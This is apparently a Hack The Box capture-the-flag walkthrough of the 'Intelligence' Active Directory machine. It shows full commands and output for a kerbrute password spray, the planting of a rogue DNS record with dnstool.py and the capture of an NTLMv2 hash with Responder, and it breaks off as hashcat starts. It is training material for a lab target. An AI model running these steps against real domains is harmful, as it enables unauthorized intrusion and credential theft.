---
title: "HTB - Intelligence"
author: [0x3ds]
date: 2025-10-21 10:00:00 +1000
description: "Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges."
categories: [Hack The Box, Machines - Windows]
tags: [htb-intelligence, intelligence, hackthebox, machine, ctf, windows, medium, nmap, crackmapexec, smbmap, smbclient, smb, dns, dnsenum, ldapsearch, exiftool, gobuster, kerbrute, python, password-spray, bloodhound, bloodhound-python, dnstool, responder, hashcat, readgmsapassword, gmsa, gmsadumper, silver-ticket, wmiexec]
image:
  path: /assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_infocard.png
cover: /assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_infocard.png
---

## User Flag
---
### Initial Enumeration

We can start out by using the `nmap` tool to perform a port scan in an attempt to try and identify if there are any open ports on the target host.

```bash
0x3ds@kali $ sudo nmap 10.129.235.228 -sV -sC -T4

Nmap scan report for 10.129.235.228
Host is up (0.034s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-21 08:12:21Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.37 seconds

```

We can see that it appears the target is an active directory environment and we have identified the domain name of `intelligence.htb`.

Since we have identified SMB services running on ports `TCP/139` and `TCP/445`, we can attempt to authenticate and enumerate if there are any shares we are able to access. We can first utilise `crackmapexec` to see if we are able to authenticate successfully. We will try using the username `guest` with a blank password. 

```bash
0x3ds@kali $ crackmapexec smb 10.129.235.228 -u 'guest' -p ''


SMB   10.129.235.228   445   DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

SMB   10.129.235.228   445   DC   [-] intelligence.htb\guest: STATUS_ACCOUNT_DISABLED
```

Unfortunately, we are unable to authenticate, however we are able to identify the name of the target host on the IP Address `10.129.235.228` as having the hostname `DC`.


Returning to our `nmap` output, we also have identified a HTTP service running on port `TCP/80`. We can attempt to navigate to the website in our browser to see if we are able to access it at `10.129.235.228:80`.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_1.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_1.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We can see that we are able to successfully access the website. However, there is not much for us to go off.

Upon further enumeration of the web page itself, we are able to see that there is the option to download two files:
- `Announcement Document`
- `Other Document`

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_2.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_2.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

Upon accessing the files:
- `2020-01-01-upload.pdf`


![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_3.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_3.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


- `2020-12-15-upload.pdf`


![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_4.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_4.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


We are able to identify two interesting things.
1. The files are in the directory: `documents/`
2. The files follow the same naming convention: `YYYY-MM-DD-upload.pdf`

Further, when analysing the two files that we currently have access to and viewing the document properties, we are able to see that the metadata has not been erased.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_5.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_5.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

This exposed the name of the creator which published the documents.
- `William.Lee`
- `Jose.Williams` 

These look like they could potentially be usernames. As such, we can now leverage this and utilise the tool `kerbrute` to see if we can validate either of these names as being usernames. 

```bash
0x3ds@kali $ kerbrute userenum --dc 10.129.235.228 -d intelligence.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/21/25 - Ronnie Flathers @ropnop

2025/10/21 13:04:51 >  Using KDC(s):
2025/10/21 13:04:51 >   10.129.235.228:88

2025/10/21 13:04:52 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2025/10/21 13:04:52 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2025/10/21 13:04:52 >  Done! Tested 2 usernames (2 valid) in 0.131 seconds
```

And *voila*, we have successfully validated that the two creators of the PDF documents we located on the website are valid usernames.

Knowing that the creators are also valid users, and that the documents we identified follow a similar naming convention, we can attempt to brute force other files within the `documents/` directory.

To do this, we can utilise the `burpsuite Intruder` tool. First we can turn on our proxy via `FoxyProxy` to be able to intercept the web requests in `burpsuite`

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_6.png){: .light .w-50 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_6.png){: .dark .w-50 .shadow .rounded-10 w='1212' h='668' }


With our proxy active, we can now open `burpsuite` and navigate to the tab `Proxy` -> `Intercept`, and turn on the intercept tool.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_7.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_7.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Now we can return to our browser where we have one of the files open and reload the page using the short-cut `CTRL + SHIFT + R` to capture the request in `burpsuite`.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_8.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_8.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We can see that we have successfully captured the request.

We can now send this request through to the `intruder` by either using the short-cut `CTRL + I`, or by right-clicking the request and selecting `Send To Intruder`

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_9.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_9.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Having sent the request to the `intruder`, we can now navigate to the `intruder` tab where we will see the request there.  

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_10.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_10.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


With the request now in the intruder, we can set up our attack.

We will leave the Attack type as `Sniper attack`. Since we are trying to find other documents that follow the same naming convention of `YYYY-MM-DD-upload.pdf` where the variable is `YYYY-MM-DD`, we can add the `§` symbol (payload position pointer) either side the variable in the request. In our case it will go in the first line as follows:\
`GET /documents/§2020-01-01§-upload.pdf HTTP/1.1`

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_11.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_11.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


Next, we will need to configure our `Payload` settings:
1. First we will need to set the `Payload type` to `Dates`.
2. Next, under the `Payload configuration` heading, we will: 
- Set the `From` fields to be `01` `January` `2020` respectively.
- Set the `To` fields to be `01` `January` `2021` respectively.
- Set the `Step` fields to be `1` `Days` respectively.
- Select the second `Format` option (custom), and set it to `YYYY-MM-dd`.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_12.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_12.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }



With our payload options configured, we can now go ahead and start our attack by selecting `Start attack`. This opens a new window where `burpsuite Intruder` will attempt to repeat the web request of accessing the `documents/` directory and will go through each of the dates throughout the period we set defined by the `From` and `To` fields (in our case 1 year period).

We can see various column headings that we can utilise to identify which requests we are interested in:
- `Request` - The number to identify the request identifier.
- `Payload` - The variable that will change from request to request.
- `Status code` - The status code that is returned from the response to the web request.
- `Length` - The length of the response to the web request.

We can also sort the results by ascending or descending order by clicking on one of the column headers. Since we only want to see the results of valid files, we can sort the `Status code` column to have the responses that returned a `Status code` of `200` (indicating that it was a valid request) appear at the top of the results list.


![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_13.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_13.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


We can now see all of the requests that returned a `Status code` of `200` as well as their corresponding `Payload` 

However, when we try to view the response of the requests for the valid files, we are unable to read any of the contents since the files are .pdf and thus the contents are encoded and not in plain text. As such, we can simply navigate to the URL of the files in an attempt to access them directly and read them via our browser. 

After going through the files, we are able to identify two very interesting files:
- `2020-06-04-upload.pdf`
- `2020-12-30-upload.pdf`

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_14.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_14.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_15.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_15.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }


We can see that in the file `2020-06-04-upload.pdf`, it includes a guide for new accounts. Within it, it mentions to login using a username and the default password of: `NewIntelligenceCorpUser9876`. Knowing the default password is very beneficial for us since we are able to leverage this and attempt a password spraying attack against users of the target domain `intelligence.htb`. 

Additionally, in the file `2020-12-30-upload.pdf`, we can see the details of an internal IT update. It appears there had been some outages with the web servers and someone by the name of `Ted` had created a script to help notify if the outage occurs again. Further, there is discussion of locking down the `service accounts`. This indicates two things:
1. `Ted` is a technical employee, we can keep an eye out if we see anything related to this user.
2. The `service accounts` need to be locked down - indicating that they may be configured poorly with weak permissions that we could exploit.

We can make a mental note of these items and return to them later. For now, we can proceed with the password spraying attack. To do this, we will need to obtain a list of users that we can target. Remembering that the PDF files we initially found contained creators that ended up being valid usernames, we could use our list of valid PDF files and collate the `usernames` from the `Creator` field. Luckily for us, despite the contents of the PDF files not being human readable, the metadata, including the `Creator` field, are in plain human readable text.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_16.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_16.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

Too speed up the process of extracting the username from the PDF files, we can right-click on one of the successful valid requests and select `Define extract grep from response`. 

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_17.png){: .light .w-75 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_17.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }

This will open a new window where we can do the following to correctly set up the extraction of the usernames:
1. Tick the `Define start and end` box.
2. Scroll down in the response box until you find the line that includes the `Creator` field.
3. Highlight the username (in this example `Jason.Wright`)
- This will automatically define the start and end expressions. 
4. Select `OK`.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_18.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_18.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }

We can now see that there is a new column heading that successfully extracted the creator's username from each request and displays it for us.

![light mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_19.png){: .light .w-100 .shadow .rounded-10 w='1212' h='668' }
![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_19.png){: .dark .w-100 .shadow .rounded-10 w='1212' h='668' }


Since we do not have the enterprise version of `burpsuite`, we cannot save the results table which would allow us to easily copy the usernames across into our `users.txt` file. 

However, a work around for this would be to: 
1. Select/highlight all of the results that populated a username.
2. Then, right click one of them and select `Save selected items`.
3. Un-tick the `Base64-encode requests and responses`.
4. Choose the location you want to save the file and give it a name.
5. Write a simple script to extract the usernames from the output file.

In our case, we have called the saved file "`intruder-results`".

Now before we write up a script that will extract the usernames, let us review what we have and the objectives of the script:
- We have a file called "intruder-results" it is in xml format. 
  - It contains all the requests and responses from my burpsuite intruder. 
- In each response there is a lot of data, including 2 lines that go line "/Creator (user.name)"
  - With one of the 2 lines always being "/Creator (TeX)", of which we do not want to extract. 
- We want to extract the User.Name and then append it to a file.
  - We will call the file `users.txt` for the sake of this scenario. 
- However, there are some duplicate usernames, and we do not want to append the duplicates.

With these known, we can write a script that will meet these conditions. We will use python since it is easy to work with and flexible.

```python
#!/usr/bin/env python3

import sys
import re
from pathlib import Path

if len(sys.argv) < 2:
    print("Usage: python3 extract_creators.py <burpsuite-output-file> [users.txt]")
    sys.exit(2)

in_path = Path(sys.argv[1])
out_path = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("users.txt")

if not in_path.exists():
    print(f"Error: input file not found: {in_path}")
    sys.exit(1)

txt = in_path.read_bytes().decode("utf-8", errors="ignore")

# regex to capture what's inside the parentheses after "/Creator ( ... )"
# Uses a literal match for "/Creator (" then captures everything up to the next ")"
matches = re.findall(r'/Creator\s*\(\s*([^)]+?)\s*\)', txt)

# Normalize and filter
found = []
for m in matches:
    name = m.strip()
    if name == "":
        continue
    # ignore TeX (case-insensitive)
    if name.lower() == "tex":
        continue
    found.append(name)

# unique preserving order
seen = set()
unique_found = []
for n in found:
    if n not in seen:
        seen.add(n)
        unique_found.append(n)

# read existing usernames (if any). Strip whitespace, ignore empty lines
existing = []
if out_path.exists():
    with out_path.open("r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.rstrip("\n\r")
            if s != "":
                existing.append(s)

existing_set = set(existing)

# Determine new entries (preserve order from file)
new_entries = [u for u in unique_found if u not in existing_set]

if not new_entries:
    print("No new usernames to append.")
    sys.exit(0)

# Append to target file
out_path.parent.mkdir(parents=True, exist_ok=True)
with out_path.open("a", encoding="utf-8", errors="ignore") as f:
    for u in new_entries:
        f.write(u + "\n")

print(f"Appended {len(new_entries)} new username(s) to {out_path}:")
for u in new_entries:
    print("  -", u)
```

After creating the script, I noticed that the intruder results included PDF files that we had already manually extracted two usernames from. As such, I decided to delete the original `users.txt` file we created earlier since those usernames would get extracted when we run our script anyway.

With our script finally put together, we can go ahead and run it by passing the intruder output file as an argument.

```bash
0x3ds@kali $ python3 username-extractor.py intruder-results

Appended 30 new username(s) to users.txt:
  - William.Lee
  - Veronica.Patel
  - Travis.Evans
  - Tiffany.Molina
  - Thomas.Valenzuela
  - Thomas.Hall
  - Teresa.Williamson
  - Stephanie.Young
  - Scott.Scott
  - Samuel.Richardson
  - Richard.Williams
  - Nicole.Brock
  - Kelly.Long
  - Kaitlyn.Zimmerman
  - Jose.Williams
  - John.Coleman
  - Jessica.Moody
  - Jennifer.Thomas
  - Jason.Wright
  - Jason.Patterson
  - Ian.Duncan
  - David.Wilson
  - David.Reed
  - David.Mcbride
  - Darryl.Harris
  - Danny.Matthews
  - Daniel.Shelton
  - Brian.Morris
  - Brian.Baker
  - Anita.Roberts
```


After running the script, we can see that we have successfully extracted 30 unique usernames from the intruder results file into a file called `users.txt`!



---
### Obtaining Foothold

Now that we have successfully extracted 30 unique usernames from the intruder results file into a file called `users.txt`, we can go ahead and use `kerbrute` to perform a password spray attack using the default password we found 'NewIntelligenceCorpUser9876'


First, we should set ntp time to off and then sync our NTP time to the target of `10.129.235.228`.
Since NTP, (Network Time Protocol), is used to keep computer clocks accurate by synchronising them over the Internet or a local network, or by following an accurate hardware receiver that interprets GPS, DCF-77, NIST, or similar time signals. We do not want to run into any issues when attempting to authenticate to the target Domain Controller, so performing these steps should ensure we do not have any false positives or false negatives.

```bash
0x3ds@kali $ sudo timedatectl set-ntp off && sudo rdate -n 10.129.235.228

```

Now we should not run into any issues, and we can go ahead and run our password spray attack.

```bash
0x3ds@kali $ kerbrute passwordspray --dc 10.129.235.228 -d intelligence.htb users.txt 'NewIntelligenceCorpUser9876'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/21/25 - Ronnie Flathers @ropnop

2025/10/21 23:31:13 >  Using KDC(s):
2025/10/21 23:31:13 >   10.129.235.228:88

2025/10/21 23:31:13 >  [+] VALID LOGIN:  Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876
2025/10/21 23:31:13 >  Done! Tested 30 logins (1 successes) in 0.268 seconds
```

We can see that we have been able to identify a username, `Tiffany.Molina`, which successfully authenticated when using the default password `NewIntelligenceCorpUser9876`.

With our newfound set of credentials (`Tiffany.Molina`:`NewIntelligenceCorpUser9876`), we can now return to performing further enumeration. We can start off by seeing if this user is able to authenticate to the SMB service that we identified during our `nmap` scans.

```bash
0x3ds@kali $ crackmapexec smb 10.129.235.228 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 

SMB  10.129.235.228   445   DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

SMB  10.129.235.228   445   DC   [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

We can see that the user `Tiffany.Molina` is able to successfully authenticate to the SMB service!

We can use `SMBmap` to enumerate which shares this user has access to.

```bash
0x3ds@kali $ smbmap -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -H 10.129.235.228

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.235.228:445   Name: 10.129.235.228   Status: Authenticated
        Disk                       Permissions      Comment
        ----                       -----------      -------
        ADMIN$                     NO ACCESS        Remote Admin
        C$                         NO ACCESS        Default share
        IPC$                       READ ONLY        Remote IPC
        IT                         READ ONLY
        NETLOGON                   READ ONLY        Logon server share 
        SYSVOL                     READ ONLY        Logon server share 
        Users                      READ ONLY

[*] Closed 1 connections                                                                 
```

We can see that we are able to access the following SMB Shares:
- `IPC$`
- `IT`
- `NETLOGON`
- `SYSVOL`
- `Users`

Both the `IT` and `Users` SMB Shares look to be interesting targets for us to perform additional enumeration on.


We can utilise the `smbclient` tool to authenticate to the SMB Shares. We can first try to authenticate to the `Users` share using the credentials we have for the user `Tiffany.Molina`.

```bash
0x3ds@kali $ smbclient -U 'intelligence.htb'/'Tiffany.Molina'%'NewIntelligenceCorpUser9876' //10.129.235.228/Users

Try "help" to get a list of possible commands.
smb: \> 
```

And we have successfully authenticated to the `Users` SMB Share.

We can now take a look around to see what we can find.

```bash
smb: \> ls

  .                        DR        0  Mon Apr 19 11:20:26 2021
  ..                       DR        0  Mon Apr 19 11:20:26 2021
  Administrator             D        0  Mon Apr 19 10:18:39 2021
  All Users             DHSrn        0  Sat Sep 15 17:21:46 2018
  Default                 DHR        0  Mon Apr 19 12:17:40 2021
  Default User          DHSrn        0  Sat Sep 15 17:21:46 2018
  desktop.ini             AHS      174  Sat Sep 15 17:11:27 2018
  Public                   DR        0  Mon Apr 19 10:18:39 2021
  Ted.Graves                D        0  Mon Apr 19 11:20:26 2021
  Tiffany.Molina            D        0  Mon Apr 19 10:51:46 2021

      3770367 blocks of size 4096. 1456871 blocks available
```

When listing the current directory, we can see the user `Ted.Graves` which may be the same `Ted` that was mentioned in the internal IT update PDF file we found.

Continuing to enumerate further, we are able to locate the `user.txt` flag in the `Tiffany.Molina\Desktop\` directory.

```bash
smb: \>  ls Tiffany.Molina\Desktop\

  .                        DR        0  Mon Apr 19 10:51:46 2021
  ..                       DR        0  Mon Apr 19 10:51:46 2021
  user.txt                 AR       34  Tue Oct 21 18:09:46 2025
```

We can attempt to read the contents of this file and obtain the flag.


```bash
smb: \>  get Tiffany.Molina\Desktop\user.txt -

48eb5***************************
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as - (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

From this we have been able to successfully obtain the `user.txt` flag!

> **Answer: `48eb5***************************`**
{: .prompt-tip }




## Root Flag
---
### Lateral Movement (Part 1)


Further enumeration of the `Users` SMB Share does not reveal anything interesting that we can use to further our access.

As such, we can use the credentials for `Tiffany.Molina` to authenticate to and access the `IT` SMB Share that we saw earlier we have access to from the `SMBmap` output.

```bash
0x3ds@kali $ smbclient -U 'intelligence.htb'/'Tiffany.Molina'%'NewIntelligenceCorpUser9876' //10.129.235.228/IT    

Try "help" to get a list of possible commands.
smb: \> 
```

After successfully authenticating to the `IT` SMB Share, we can see that there is only one file there called `downdetector.ps1`. This may be the script that was referred to in the internal IT update.

```bash
smb: \> ls

  .                        D        0  Mon Apr 19 10:50:55 2021
  ..                       D        0  Mon Apr 19 10:50:55 2021
  downdetector.ps1         A     1046  Mon Apr 19 10:50:55 2021

                3770367 blocks of size 4096. 1456265 blocks available
```

We can download this file to our local machine and review the contents of it.

```bash
smb: \> get downdetector.ps1

getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (8.0 KiloBytes/sec) (average 8.0 KiloBytes/sec)
```

With the file downloaded, we can go ahead and review the contents of it.

```bash
0x3ds@kali $ cat downdetector.ps1

# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
  try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
      Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}
```

After reviewing the contents of the file and doing some research to try and better understand exactly what it does, it appears that it does the following:
- Loads the ActiveDirectory PowerShell module.
- Enumerates DNS records in the Active Directory DNS zone.
- Finds results where the name starts with `web`.
- Attempts to perform a HTTP request to each of those results it found.
- Looks for the responses that do not return the `StatusCode` equal to `200`.
- For those responses, it will send an email to `Ted.Graves@intelligence.htb` alerting of the down host.

This required me to do some research to understand exactly how this could be leveraged by us as the attackers to further our access.

Essentially, we know that the script performs HTTP requests to all hosts that begin with `web`. Further, by default, authenticated domain joined users have permissions granted that allow for creating Active Directory integrated DNS records. If the default permissions have not been modified, we may be able to create our own DNS record that points to our own IP address. We can then attempt to intercept the HTTP request that is performed by the script.

Upon further research, we can utilise the "[**Kerberos relaying and unconstrained delegation abuse toolkit**](https://github.com/dirkjanm/krbrelayx)" (`Krbrelayx`). More specifically the `dnsenum.py` tool which will allow us to "Add/modify/delete Active Directory Integrated DNS records via LDAP".


```bash
0x3ds@kali $ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.129.235.228 -r webpwned -a add -t A -d 10.10.14.8

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

We now need to start up a listener on our `tun0` network interface with IP Address `10.10.14.8`. There are various ways in which we can do this. Most simple is to utilise `Responder` which can capture the credentials that the script is using to perform the HTTP requests.

```bash
0x3ds@kali $ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
<SNIP>

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.8]
    Responder IPv6             [dead:beef:2::1006]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-X70X2JX66VQ]
    Responder Domain Name      [YUKG.LOCAL]
    Responder DCE-RPC Port     [45393]

[*] Version: Responder 3.1.7.0
<SNIP>

[+] Listening for events...                              
```

With `Responder` set up, we now just need to wait for the script to run and perform HTTP requests.

After a few minutes we can see that we have captured the `NTLMv2` hash of the user `intelligence\Ted.Graves`!

```bash
0x3ds@kali $ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.235.228
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:a4da3d4736a14f9f:4B00B35C5D384A9309F168953F5AC077:0101000000000000CE7ECFB79742DC018548FF43A79EDD370000000002000800590055004B00470001001E00570049004E002D00580037003000580032004A005800360036005600510004001400590055004B0047002E004C004F00430041004C0003003400570049004E002D00580037003000580032004A00580036003600560051002E00590055004B0047002E004C004F00430041004C0005001400590055004B0047002E004C004F00430041004C000800300030000000000000000000000000200000FB96B576818F6E10C4053A5AB87D226BC19BCE5277823FD2CF6ECB09D732B8690A0010000000000000000000000000000000000009003C0048005400540050002F00770065006200700077006E00650064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

We can attempt to use `hashcat` to try and crack this hash to reveal the plaintext password. 

First, we will copy the password hash into a text file.


```bash
0x3ds@kali $ echo 'Ted.Graves::intelligence:a4da3d4736a14f9f:4B00B35C5D384A9309F168953F5AC077:0101000000000000CE7ECFB79742DC018548FF43A79EDD370000000002000800590055004B00470001001E00570049004E002D00580037003000580032004A005800360036005600510004001400590055004B0047002E004C004F00430041004C0003003400570049004E002D00580037003000580032004A00580036003600560051002E00590055004B0047002E004C004F00430041004C0005001400590055004B0047002E004C004F00430041004C000800300030000000000000000000000000200000FB96B576818F6E10C4053A5AB87D226BC19BCE5277823FD2CF6ECB09D732B8690A0010000000000000000000000000000000000009003C0048005400540050002F00770065006200700077006E00650064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000' > ted_graves-ntlmv2

```


Now that we have our file `ted_graves-ntlmv2` ready to pass to `hashcat`, we can go ahead and do so by specifying the wordlist we want to use, along with the `-m 5600` to specify the correct hash mode (NetNTLMv2).

```bash
0x3ds@kali $ hashcat -m 5600 ted_graves-ntlmv2 /usr/share/wordlists/rockyou.txt

hashcat (v7.1.2) starting

